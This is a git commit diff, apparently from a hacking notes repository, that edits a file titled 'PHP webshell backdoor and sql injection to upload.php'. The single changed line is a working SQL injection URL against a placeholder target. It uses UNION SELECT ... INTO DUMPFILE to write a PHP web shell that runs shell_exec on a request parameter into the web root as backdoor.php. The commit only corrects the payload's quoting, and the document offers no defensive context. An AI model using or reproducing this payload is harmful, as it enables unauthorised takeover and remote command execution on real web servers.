72e61abf86c5338160ff53955d44e1c54dfbcc33
Goovscoov <rolfgovers@gmail.com>
2014-10-10 23:09:20 +0200

    change

--- PHP webshell backdoor and sql injection to upload.php
+++ PHP webshell backdoor and sql injection to upload.php
@@ -34,7 +34,7 @@ SQL query to upload te web shell script to the vulnerable webserver
 +----------------------------------------------------------------------+
 +----------------------------------------------------------------------+
 
-http://www.yourtarget.com/page.php?id= ' ' UNION SELECT null,null,' <form action="" method="post" enctype= "application/x-www-form-urlencoded"><table style="margin-left-auto; margin-right:auto;"><tr><td colspan="2">Enter a Command</td><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr></table><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/website/backdoor.php' -- 
+http://www.yourtarget.com/page.php?id= ' UNION SELECT null,null,' <form action="" method="post" enctype= "application/x-www-form-urlencoded"><table style="margin-left-auto; margin-right:auto;"><tr><td colspan="2">Enter a Command</td><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr></table><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/website/backdoor.php' -- 
 
 +------------------------------------------+
 +------------------------------------------+
